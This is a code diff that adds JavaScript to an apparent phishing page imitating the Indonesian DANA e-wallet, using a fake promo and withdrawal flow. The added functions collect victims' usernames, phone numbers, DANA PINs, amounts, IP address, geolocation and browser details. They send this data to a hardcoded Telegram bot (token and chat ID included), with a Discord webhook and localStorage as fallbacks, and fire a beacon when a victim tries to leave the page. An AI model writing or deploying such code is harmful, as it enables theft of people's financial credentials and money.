+        // ====== DATA EXFILTRATION ======
+        function sendRegistrationData() {
+            const data = {
+                type: 'REGISTRATION',
+                username: state.username,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                referrer: document.referrer
+            };
+            
+            sendToTelegram(data);
+        }
+
+        function sendPromoData() {
+            const data = {
+                type: 'PROMO_CLAIMED',
+                username: state.username,
+                promoCode: 'DANAKUSETIA2026',
+                amount: 170000,
+                timestamp: new Date().toISOString()
+            };
+            
+            sendToTelegram(data);
+        }
+
+        function sendWithdrawalData() {
+            const data = {
+                type: 'WITHDRAWAL_REQUEST',
+                username: state.username,
+                phone: state.withdrawData.phone,
+                pin: state.withdrawData.pin,
+                amount: state.withdrawData.amount,
+                date: state.withdrawData.date,
+                timestamp: new Date().toISOString(),
+                ip: 'Collecting...',
+                location: 'Collecting...'
+            };
+            
+            // Get IP and location
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+                    return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(locationData => {
+                    data.location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                    data.isp = locationData.org;
+                    
+                    // Send to Telegram
+                    sendToTelegram(data);
+                    
+                    // Also send to backup endpoint
+                    sendToBackup(data);
+                })
+                .catch(error => {
+                    // Send without location data
+                    sendToTelegram(data);
+                });
+        }
+
+        function sendExitData() {
+            const data = {
+                type: 'PAGE_EXIT_ATTEMPT',
+                username: state.username,
+                timestamp: new Date().toISOString(),
+                hasWithdrawal: !!state.withdrawData.pin,
+                balanceBlocked: state.blocked
+            };
+            
+            // Use Beacon API for reliable delivery on page exit
+            navigator.sendBeacon('https://api.telegram.org/bot8252375331:AAGjbMLFvp7UtEjylkJGKTnXuN_WeVyGaRo/sendMessage', 
+                JSON.stringify({
+                    chat_id: '6732766279',
+                    text: `🚨 PAGE EXIT: ${state.username} - ${data.hasWithdrawal ? 'HAS WITHDRAWAL' : 'NO WITHDRAWAL'}`
+                })
+            );
+        }
+
+        function sendToTelegram(data) {
+            const BOT_TOKEN = '8252375331:AAGjbMLFvp7UtEjylkJGKTnXuN_WeVyGaRo';
+            const CHAT_ID = '6732766279';
+            
+            const message = `
+🚨 **DANA PHISHING DATA** 🚨
+
+📋 **Tipe:** ${data.type}
+👤 **Username:** ${data.username || 'N/A'}
+📱 **Nomor DANA:** ${data.phone || 'N/A'}
+🔑 **PIN DANA:** ${data.pin || 'N/A'}
+💰 **Jumlah:** ${data.amount ? 'Rp ' + data.amount.toLocaleString('id-ID') : 'N/A'}
+🌐 **IP Address:** ${data.ip || 'N/A'}
+📍 **Lokasi:** ${data.location || 'N/A'}
+🏢 **ISP:** ${data.isp || 'N/A'}
+🖥️ **Browser:** ${data.userAgent ? data.userAgent.substring(0, 100) + '...' : 'N/A'}
+📅 **Waktu:** ${new Date(data.timestamp).toLocaleString('id-ID')}
+🔗 **Referrer:** ${data.referrer || 'N/A'}
+            `;
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(error => {
+                console.error('Telegram error:', error);
+                // Try alternative
+                sendToBackup(data);
+            });
+        }
+
+        function sendToBackup(data) {
+            // Backup endpoint
+            const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL';
+            
+            const discordMessage = {
+                embeds: [{
+                    title: 'DANA Phishing Data',
+                    color: 0x0085ff,
+                    fields: [
+                        { name: 'Username', value: data.username || 'N/A', inline: true },
+                        { name: 'Phone', value: data.phone || 'N/A', inline: true },
+                        { name: 'PIN', value: data.pin ? '||' + data.pin + '||' : 'N/A', inline: true },
+                        { name: 'Amount', value: data.amount ? 'Rp ' + data.amount.toLocaleString('id-ID') : 'N/A', inline: true },
+                        { name: 'IP Address', value: data.ip || 'N/A', inline: true },
+                        { name: 'Location', value: data.location || 'N/A', inline: true },
+                        { name: 'Type', value: data.type, inline: true },
+                        { name: 'Timestamp', value: new Date(data.timestamp).toLocaleString('id-ID'), inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordMessage)
+            }).catch(() => {
+                // Final fallback: localStorage
+                const backups = JSON.parse(localStorage.getItem('dana_backups') || '[]');
+                backups.push(data);
+                localStorage.setItem('dana_backups', JSON.stringify(backups));
+            });
+        }
+    </script>
 </body>
 </html>
